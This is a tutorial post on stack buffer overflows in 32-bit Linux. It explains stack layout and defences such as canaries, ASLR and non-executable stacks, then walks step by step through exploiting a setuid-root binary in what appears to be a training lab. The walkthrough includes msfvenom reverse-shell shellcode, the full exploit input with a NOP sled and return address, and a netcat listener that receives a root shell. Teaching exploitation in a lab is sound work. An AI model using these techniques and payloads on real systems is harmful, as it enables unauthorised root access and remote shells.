---
title: "Stack-Based Buffer OverFlows on Linux X86"
date: 23-09-2025
categories: [Guides]
tags: [Buffer Overflow, gdb, Exploit Development]
image: /assets/images/overflow/icon.png
---

Buffer overflows are not as common anymore thanks to safer coding practices and the adoption of secure programming languages like Python and Java, which have replaced more traditional, unsafe ones like C. Nevertheless, I find the discovery and exploitation of buffer overflows fascinating, and in this post, I will showcase a simple example. But first, let’s cover the basics.

## What is a Buffer Overflow?

A buffer overflow is a type of programming bug where a program writes more data into a buffer (a fixed-size block of memory) than it can hold, which can overwrite adjacent memory. When this happens we will receive a segmentation fault warning, meaning that a restricted area of memory was overwritten by the program. Lets take the following vulnerable program as an example:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int copy_str(char *string) {
    char buffer[10];
    strcpy(buffer, string);
    printf("copied text: %s\n", buffer);
    return 1;
}

int main(int argc, char *argv[]) {
   copy_str(argv[1]);
   printf("Done.\n");
   return 1;
}
```

We can see that the program takes one argument as input and copies it to a small buffer which only holds 10 bytes and then outputs it to the terminal. Lets compile the program and show its behavior with different inputs.
```sh
gcc example.c -o example
```

Lets provide it first with a valid input:
```sh
./example works!
copied text: works!
Done.
```

We can clearly see that it worked and the program exited normally. I believe it is easier to understand why it worked by using a diagram (Figure 1a). In this program we are using the stack to allocate a predetermined amount of bytes for a buffer. We can see that the stack frame begins with the return address which points to the next instruction to be executed once the current stack frame is finished. Next comes the EBP also known as the frame pointer which is used to reference local variables and acts as a base for the stack frame. Below them is the buffer we are using, it has a size of 10 bytes and gets filled up from the bottom up. In this example our buffer contains the input we used when we ran the program: <code>works!</code>. Since the input is less than 10 characters in length, it did not completely fill up the buffer so the rest of it is just filled with garbage values that where already there before allocating the buffer. Lets try again with an input with a size of 10 characters. 


![combined](/assets/images/overflow/combined_1.svg)

```sh
./example overflows!
copied text: overflows!
Done.
Segmentation fault
```

Our input was 10 characters long and the buffer can hold 10 bytes then why did it crash? The answer is simple: strings in C have to be terminated with the null byte <code>\0</code>. This byte got automatically added because we were using the `strcpy` function. Which means that our input was actually 11 bytes long, overflowing the buffer and exiting with a segmentation fault. Figure 1b shows this process. We can see that it overflowed by 1 byte into the EBP corrupting important memory and that is the reason why our program did not exit correctly. At this point you may see where we are getting to. 

The last sub figure shows how we can overwrite the return address which is the goal of a buffer overflow. Our objective will be to write down malicious code somewhere on the stack and then write down the address of the start of that code into the return pointer which will execute it when we leave the stack frame.

## How Are They Prevented?
Modern systems are very well protected against these vulnerabilities. I had to manually disable some in my system before attempting this showcase. Here are few of the most popular solutions:

### Canaries
Stack canaries, named for their analogy to a canary in a coal mine, are used to detect a stack buffer overflow before execution of malicious code can occur. We are basically writing a small integer value before the return address. If you remember, our buffer grew from the bottom up, meaning that if we wanted to overwrite the return address we would also have to overwrite the canary. Before leaving the stack frame this value is checked, if the value does not match the system will know that it was tampered with. This defense is not bullet proof as an attacker can attempt to read the canary value by some non-traditional means.

### ASLR
ASLR (Address Space Layout Randomization) is a computer security technique that randomizes the memory locations of key areas of a program's address space, such as the executable code, the stack, and system libraries, each time it runs. This makes it significantly harder for attackers to execute memory corruption exploits, like buffer overflows, because they cannot predict the memory addresses needed to inject malicious code.

### Nonexecutable stack

Another approach to preventing stack buffer overflow exploitation is to enforce a memory policy on the stack memory region that disallows execution from the stack (W^X, "Write XOR Execute"). This means that in order to execute shellcode from the stack an attacker must either find a way to disable the execution protection from memory, or find a way to put their shellcode payload in a non-protected region of memory. This method is becoming more popular now that hardware support for the no-execute flag is available in most desktop processors. 

## Showcase 
This example shows a simple buffer overflow in a x86 Linux architecture. We do not know the source code, but this does not actually matter in this example. There wont by any protections enabled so it is a very trivial example.

To disable ASLR use the following commands.
```sh
sudo su
root# echo 0 > /proc/sys/kernel/randomize_va_space
root# cat /proc/sys/kernel/randomize_va_space
```

The binary in this case was compiled using the following gcc command:
```
gcc leave_msg.c -o leave_msg -fno-stack-protector -z execstack -m32
```

It is important to see that this binary runs with root privileges as it has the setuid bit activated
```sh
ls -la
drwxr-xr-x 4 student     student     4096 Sep 23 18:35 .
drwxr-xr-x 4 root        root        4096 Aug  3  2021 ..
-rwsr-xr-x 1 root        root        7448 Nov 20  2020 leave_msg
```
### Finding the Buffer Overflow
We can test for a buffer overflow by fuzzing the input parameter, but we can also try to provide a very large input and see how the program reacts.
```sh
./leave_msg $(python -c print'"A" * 2000')
Message left for the administrator
```

We ran the program with a large string length of 2000 characters and it did not crash. Lets try with a larger input:

```sh
./leave_msg $(python -c print'"A" * 3000')
Segmentation fault (core dumped)
```

Nice, the program crashed. Lets take a look at the registers with gdb
```sh
htb-student@nixbof32skills:~$ gdb leave_msg
<SNIP>
(gdb) run $(python -c print'"A" * 3000')
Starting program: /home/student/leave_msg $(python -c print'"A" * 3000')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
eax            0x0	0
ecx            0x15	21
edx            0x56558158	1448444248
ebx            0x41414141	1094795585
esp            0xffffc8f0	0xffffc8f0
ebp            0x41414141	0x41414141
esi            0xffffc930	-14032
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x10282	[ SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

### Identifying how Many Bytes are Needed to Overwrite EIP
We can see that eip, the return address, got overwritten with `0x41414141` which is just our input of upper case As in hex. We now need to figure out the offset at which we can start writing the eip. To do so we can use msfconsole's `pattern_create` built-in tool, which generates a random non-repeating string.

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A<SNIP>u1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
```

Lets rerun the program with the generated string:
```sh
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A<SNIP>u1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
Starting program: /home/student/leave_msg Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A<SNIP>u1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9

Program received signal SIGSEGV, Segmentation fault.
0x37714336 in ?? ()
```

Gdb already provides the output of the eip register when it crashes and we can see it got overwritten with the value `0x37714336`. We can now use msfconsole again to find out how many bytes we need to overwrite it.

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37714336
[*] Exact match at offset 2060
```

We can test this by running the program again with an input of 2060 As followed by 4 Bs. If the offset is correct we should see eip become `x42424242`
```sh
(gdb) run $(python -c print'"A" * 2060 + "B" *4')
The program being debugged has been started already.
Starting program: /home/student/leave_msg $(python -c print'"A" * 2060 + "B" *4')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
### Identification and Removal of Bad Characters
We see the expected results, which is perfect. Our next step is going to be identifying bad characters. Some applications reserver some specific bytes as magic numbers or for other needs. We need to find them so that we do not accidentally use them in our shell code. 

To identify bad characters during a buffer overflow, we send a payload containing every possible byte value (from `\x01` to `\xff`) into the vulnerable buffer. After the payload is processed, we will then inspect the memory location where the buffer is stored to see which bytes are altered, removed, or truncated. Any bytes that do not appear as expected are considered bad characters, which cannot be used in the final shellcode.

To do this we will need to find where in the code the buffer write occurs. Lets disassemble the main function to search for vulnerable function calls.
```sh
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000073b <+0>:	lea    0x4(%esp),%ecx
   0x0000073f <+4>:	and    $0xfffffff0,%esp
   0x00000742 <+7>:	pushl  -0x4(%ecx)
   0x00000745 <+10>:	push   %ebp
   0x00000746 <+11>:	mov    %esp,%ebp
   0x00000748 <+13>:	push   %esi
   0x00000749 <+14>:	push   %ebx
   <SNIP>
   0x0000076f <+52>:	add    $0x4,%eax
   0x00000772 <+55>:	mov    (%eax),%eax
   0x00000774 <+57>:	sub    $0xc,%esp
   0x00000777 <+60>:	push   %eax
   0x00000778 <+61>:	call   0x68d <leavemsg>
```

We can see that main call the leavemsg function so lets also disassemble that one.

```sh
(gdb) disassemble leavemsg
Dump of assembler code for function leavemsg:
   0x0000068d <+0>:	push   %ebp
   0x0000068e <+1>:	mov    %esp,%ebp
   0x00000690 <+3>:	push   %ebx
   0x00000691 <+4>:	sub    $0x804,%esp
   <SNIP>
   0x000006ed <+96>:	sub    $0x8,%esp
   0x000006f0 <+99>:	pushl  0x8(%ebp)
   0x000006f3 <+102>:	lea    -0x808(%ebp),%eax
   0x000006f9 <+108>:	push   %eax
   0x000006fa <+109>:	call   0x4e0 <strcpy@plt>
   <SNIP> 
   0x00000731 <+164>:	mov    $0x0,%eax
   0x00000736 <+169>:	mov    -0x4(%ebp),%ebx
   0x00000739 <+172>:	leave  
   0x0000073a <+173>:	ret    
```

We can see that the function uses `strcpy` which is an unsafe memory function as it does not do a bound check like `strncpy`. We can also see that the buffer starts at `-0x808(%ebp)`. Lets set a break point after this instruction and inspect the stack to confirm this. 

```sh
(gdb) break *leavemsg+123
Breakpoint 1 at 0x708
(gdb) run $(python -c print'"A"*2000')
Starting program: /home/htb-student/leave_msg $(python -c print'"A"*2000')

Breakpoint 1, 0x56555708 in leavemsg ()
(gdb) x/64bx $ebp-0x808 
0xffffc4d0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffc4d8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffc4e0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffc4e8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffc4f0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffc4f8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffc500:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffc508:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
```

Looks like it worked and we can clearly see the As inside of the buffer lets now start finding bad characters by instead writing the following string of hex instead of As:
```sh
(gdb) break *leavemsg+123
Breakpoint 1 at 0x708
(gdb) run $(python -c print'"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
(gdb) x/256bx $ebp-0x808
0xffffcb90:	0x01	0x02	0x03	0x04	0x05	0x06	0x07	0x08
0xffffcb98:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffcba0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffcba8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffcbb0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffcbb8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```

Instead of showing the correct characters we placed in order we get some of them right and some others are gone or modified, lets remove the first bad characters. We can see that the first character is wrong as it should have the Null terminator `\x00` but it does not, so lets add that to our bad character list and remove it from the testing list, we can also discard `\09` too as it does not appear after `\08` lets try again with these two removed.

```sh 
(gdb) run $(python -c print'"\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
(gdb) x/254bx $ebp-0x808
0xffffcb90:	0x01	0x02	0x03	0x04	0x05	0x06	0x07	0x08
0xffffcb98:	0x0b	0x0c	0x0d	0x0e	0x0f	0x10	0x11	0x12
0xffffcba0:	0x13	0x14	0x15	0x16	0x17	0x18	0x19	0x1a
0xffffcba8:	0x1b	0x1c	0x1d	0x1e	0x1f	0x00	0x00	0x00
0xffffcbb0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffcbb8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```

Looks better but we are still missing `\0a` so lets also remove that from the testing list and add it to our bad character list. Lets see how the buffer looks after removing `\0a`
```sh 
(gdb) run $(python -c print'"\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
(gdb) x/254bx $ebp-0x808
0xffffcb90:	0x01	0x02	0x03	0x04	0x05	0x06	0x07	0x08
0xffffcb98:	0x0b	0x0c	0x0d	0x0e	0x0f	0x10	0x11	0x12
0xffffcba0:	0x13	0x14	0x15	0x16	0x17	0x18	0x19	0x1a
0xffffcba8:	0x1b	0x1c	0x1d	0x1e	0x1f	0x00	0x00	0x00
0xffffcbb0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffcbb8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```

Well it looks the same but now its correct until `\20`. Remember that we already removed `[\00\09\0a]`. Lets also remove `\20` and see what happens
```sh 
(gdb) run $(python -c print'"\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
(gdb) x/252bx $ebp-0x808
0xffffcba0:	0x01	0x02	0x03	0x04	0x05	0x06	0x07	0x08
0xffffcba8:	0x0b	0x0c	0x0d	0x0e	0x0f	0x10	0x11	0x12
0xffffcbb0:	0x13	0x14	0x15	0x16	0x17	0x18	0x19	0x1a
0xffffcbb8:	0x1b	0x1c	0x1d	0x1e	0x1f	0x21	0x22	0x23
0xffffcbc0:	0x24	0x25	0x26	0x27	0x28	0x29	0x2a	0x2b
0xffffcbc8:	0x2c	0x2d	0x2e	0x2f	0x30	0x31	0x32	0x33
0xffffcbd0:	0x34	0x35	0x36	0x37	0x38	0x39	0x3a	0x3b
0xffffcbd8:	0x3c	0x3d	0x3e	0x3f	0x40	0x41	0x42	0x43
0xffffcbe0:	0x44	0x45	0x46	0x47	0x48	0x49	0x4a	0x4b
0xffffcbe8:	0x4c	0x4d	0x4e	0x4f	0x50	0x51	0x52	0x53
0xffffcbf0:	0x54	0x55	0x56	0x57	0x58	0x59	0x5a	0x5b
0xffffcbf8:	0x5c	0x5d	0x5e	0x5f	0x60	0x61	0x62	0x63
0xffffcc00:	0x64	0x65	0x66	0x67	0x68	0x69	0x6a	0x6b
0xffffcc08:	0x6c	0x6d	0x6e	0x6f	0x70	0x71	0x72	0x73
0xffffcc10:	0x74	0x75	0x76	0x77	0x78	0x79	0x7a	0x7b
0xffffcc18:	0x7c	0x7d	0x7e	0x7f	0x80	0x81	0x82	0x83
0xffffcc20:	0x84	0x85	0x86	0x87	0x88	0x89	0x8a	0x8b
0xffffcc28:	0x8c	0x8d	0x8e	0x8f	0x90	0x91	0x92	0x93
0xffffcc30:	0x94	0x95	0x96	0x97	0x98	0x99	0x9a	0x9b
0xffffcc38:	0x9c	0x9d	0x9e	0x9f	0xa0	0xa1	0xa2	0xa3
0xffffcc40:	0xa4	0xa5	0xa6	0xa7	0xa8	0xa9	0xaa	0xab
0xffffcc48:	0xac	0xad	0xae	0xaf	0xb0	0xb1	0xb2	0xb3
0xffffcc50:	0xb4	0xb5	0xb6	0xb7	0xb8	0xb9	0xba	0xbb
0xffffcc58:	0xbc	0xbd	0xbe	0xbf	0xc0	0xc1	0xc2	0xc3
0xffffcc60:	0xc4	0xc5	0xc6	0xc7	0xc8	0xc9	0xca	0xcb
0xffffcc68:	0xcc	0xcd	0xce	0xcf	0xd0	0xd1	0xd2	0xd3
0xffffcc70:	0xd4	0xd5	0xd6	0xd7	0xd8	0xd9	0xda	0xdb
0xffffcc78:	0xdc	0xdd	0xde	0xdf	0xe0	0xe1	0xe2	0xe3
0xffffcc80:	0xe4	0xe5	0xe6	0xe7	0xe8	0xe9	0xea	0xeb
0xffffcc88:	0xec	0xed	0xee	0xef	0xf0	0xf1	0xf2	0xf3
0xffffcc90:	0xf4	0xf5	0xf6	0xf7	0xf8	0xf9	0xfa	0xfb
0xffffcc98:	0xfc	0xfd	0xfe	0xff
```

Looks correct! So our bad character list is just `[\00\09\0a\20]`. 

### Generating Shell Code
Our next step will be to generate the shell code that we will be injecting into the buffer. To generate it we can use msfvenom which already has a tool to not include our bad characters we can generate it with the following command:

```sh
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=9001 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
Saved as: shellcode
```

Our shellcode is 95 bytes long which is small enough to fit inside our buffer which can be as large as 2060 bytes. Since we have a lot of spare bytes we can use a nop sled. A nop sled is a long chain of nop instructions which basically tell the CPU to do nothing and jump to the next instruction. This helps us because our return address does not have to be exactly pointing to our shell code, it can instead point to anywhere in the nop sled and it will at some point execute our shell code. The diagram below shows the structure of the stack with our payload.

![combined](/assets/images/overflow/nop.svg)

If you recall from before we need 2060 bytes to reach the return address which we need to overwrite. lets just write it with Bs so we know we are in the right track:

```sh
(gdb) run $(python -c print'"\x90" * 1965 + "\xd9\xc6\xd9\x74\x24\xf4\xb8\x77\xd5\x11\x7f\x5e\x29\xc9\xb1\x12\x31\x46\x17\x83\xc6\x04\x03\x31\xc6\xf3\x8a\x8c\x33\x04\x97\xbd\x80\xb8\x32\x43\x8e\xde\x73\x25\x5d\xa0\xe7\xf0\xed\x9e\xca\x82\x47\x98\x2d\xea\x28\x5a\xce\xeb\xbe\x58\xce\xc8\x17\xd4\x2f\xbe\x0e\xb6\xfe\xed\x7d\x35\x88\xf0\x4f\xba\xd8\x9a\x21\x94\xaf\x32\xd6\xc5\x60\xa0\x4f\x93\x9c\x76\xc3\x2a\x83\xc6\xe8\xe1\xc4"  + "B" * 4')
Starting program: /home/htb-student/leave_msg $(python -c print'"\x90" * 1965 + "\xd9\xc6\xd9\x74\x24\xf4\xb8\x77\xd5\x11\x7f\x5e\x29\xc9\xb1\x12\x31\x46\x17\x83\xc6\x04\x03\x31\xc6\xf3\x8a\x8c\x33\x04\x97\xbd\x80\xb8\x32\x43\x8e\xde\x73\x25\x5d\xa0\xe7\xf0\xed\x9e\xca\x82\x47\x98\x2d\xea\x28\x5a\xce\xeb\xbe\x58\xce\xc8\x17\xd4\x2f\xbe\x0e\xb6\xfe\xed\x7d\x35\x88\xf0\x4f\xba\xd8\x9a\x21\x94\xaf\x32\xd6\xc5\x60\xa0\x4f\x93\x9c\x76\xc3\x2a\x83\xc6\xe8\xe1\xc4"  + "B" * 4')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
### Finding the Return Address
Perfect, the return address is now BBBB but we should instead use a real address. How can we find the correct return address? Ideally it should be somewhere in the nop sled so it slides into our shellcode. Lets find where our nopsled starts.

```sh
(gdb) x/2000xb $esp+2400
0xffffd600:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd608:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd610:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd618:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd620:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd628:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd630:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd638:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd640:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd648:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd650:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd658:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd660:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd668:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd670:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd678:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd680:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd688:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0xd9
0xffffd690:	0xc6	0xd9	0x74	0x24	0xf4	0xb8	0x77	0xd5
```

We can see that our nop sled starts at around `0xffffd688` so lets pick `0xffffd610`. Remember that we are dealing with little endian so addresses have to be reversed. Lets also start a listener and see if we get a connection. Moment of truth!
```sh
./leave_msg $(python -c print'"\x90" * 1965 + "\xd9\xc6\xd9\x74\x24\xf4\xb8\x77\xd5\x11\x7f\x5e\x29\xc9\xb1\x12\x31\x46\x17\x83\xc6\x04\x03\x31\xc6\xf3\x8a\x8c\x33\x04\x97\xbd\x80\xb8\x32\x43\x8e\xde\x73\x25\x5d\xa0\xe7\xf0\xed\x9e\xca\x82\x47\x98\x2d\xea\x28\x5a\xce\xeb\xbe\x58\xce\xc8\x17\xd4\x2f\xbe\x0e\xb6\xfe\xed\x7d\x35\x88\xf0\x4f\xba\xd8\x9a\x21\x94\xaf\x32\xd6\xc5\x60\xa0\x4f\x93\x9c\x76\xc3\x2a\x83\xc6\xe8\xe1\xc4"  + "\x10\xd6\xff\xff"')
```
```sh
nc -lvnp 9001
Listening on [0.0.0.0] (family 0, port 9001)
Connection from 127.0.0.1 37890 received!
whoami
root
```
It works!. It was a very simple buffer overflow but it was only to showcase it. The diagram below shows the payload we used. We basically wrote a nop sled into the buffer, followed by the executable shell code and then the return address.
![combined](/assets/images/overflow/final.svg)
